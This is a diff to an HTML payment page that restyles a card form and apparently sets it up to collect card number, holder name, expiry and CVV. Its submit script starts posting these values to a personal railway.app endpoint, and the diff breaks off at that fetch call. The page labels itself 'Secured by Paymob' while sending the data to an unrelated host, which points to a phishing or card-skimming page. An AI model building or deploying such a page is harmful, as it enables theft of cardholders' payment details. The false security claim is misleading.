@@ -3,21 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة الدفع</title>
+    <title>Payment Information</title>
     <style>
-        body {
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
             font-family: Arial, sans-serif;
+        }
+        body {
             background-color: #f4f4f4;
-            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
         .container {
-            width: 90%;
-            max-width: 400px;
             background: white;
-            margin: 50px auto;
+            width: 350px;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 15px;
         }
         .card {
             background: #0074D9;
@@ -27,12 +38,19 @@
             text-align: left;
             position: relative;
         }
+        .chip {
+            width: 40px;
+            position: absolute;
+            top: 10px;
+            left: 10px;
+        }
         .card input {
             width: 100%;
             background: transparent;
             border: none;
             color: white;
             font-size: 16px;
+            margin-top: 5px;
         }
         .card input::placeholder {
             color: rgba(255, 255, 255, 0.7);
@@ -46,7 +64,7 @@
             margin-bottom: 5px;
             font-weight: bold;
         }
-        input, textarea {
+        input {
             width: 100%;
             padding: 10px;
             border: 1px solid #ccc;
@@ -62,12 +80,24 @@
             font-size: 18px;
             border-radius: 5px;
             cursor: pointer;
+            margin-top: 10px;
         }
         .pay-btn:hover {
             background: #005bb5;
         }
         .logos {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
             margin-top: 10px;
+        }
+        .logos img {
+            width: 50px;
+        }
+        .secure {
+            font-size: 12px;
+            margin-top: 5px;
+            color: #666;
         }
     </style>
 </head>
@@ -76,19 +106,29 @@
     <div class="container">
         <h2>Payment Information</h2>
         <div class="card">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/88/EMV-Chip.svg" class="chip" alt="Chip">
             <p>Card Number</p>
-            <input type="text" id="cardNumber" placeholder="Enter Number" required>
+            <input type="text" id="cardNumber" placeholder="•••• •••• •••• ••••" required>
+            <p>Card Name</p>
+            <input type="text" id="name" placeholder="Enter Name" required>
+            <p>Valid Thru</p>
+            <input type="text" id="expiry" placeholder="MM/YY" required>
         </div>
 
         <form id="paymentForm">
             <div class="form-group">
+                <label>Card Number:</label>
+                <input type="text" id="cardNumber2" placeholder="Enter Card Number" required>
+            </div>
+
+            <div class="form-group">
                 <label>Card Holder Name:</label>
-                <input type="text" id="name" placeholder="Enter Name" required>
+                <input type="text" id="name2" placeholder="Enter Name" required>
             </div>
 
             <div class="form-group">
                 <label>Expiration Date:</label>
-                <input type="text" id="expiry" placeholder="MM/YY" required>
+                <input type="text" id="expiry2" placeholder="MM/YY" required>
             </div>
 
             <div class="form-group">
@@ -100,18 +140,20 @@
         </form>
 
         <div class="logos">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Visa.svg/120px-Visa.svg.png" alt="Visa" width="40">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/120px-Mastercard-logo.svg.png" alt="MasterCard" width="40">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Visa.svg/120px-Visa.svg.png" alt="Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/120px-Mastercard-logo.svg.png" alt="MasterCard">
         </div>
+
+        <p class="secure">🔒 Secured by Paymob</p>
     </div>
 
     <script>
         document.getElementById("paymentForm").addEventListener("submit", function(event) {
             event.preventDefault();
 
-            const cardNumber = document.getElementById("cardNumber").value;
-            const name = document.getElementById("name").value;
-            const expiry = document.getElementById("expiry").value;
+            const cardNumber = document.getElementById("cardNumber2").value;
+            const name = document.getElementById("name2").value;
+            const expiry = document.getElementById("expiry2").value;
             const cvv = document.getElementById("cvv").value;
 
             fetch("https://nodejs-production-7090.up.railway.app/send", { 
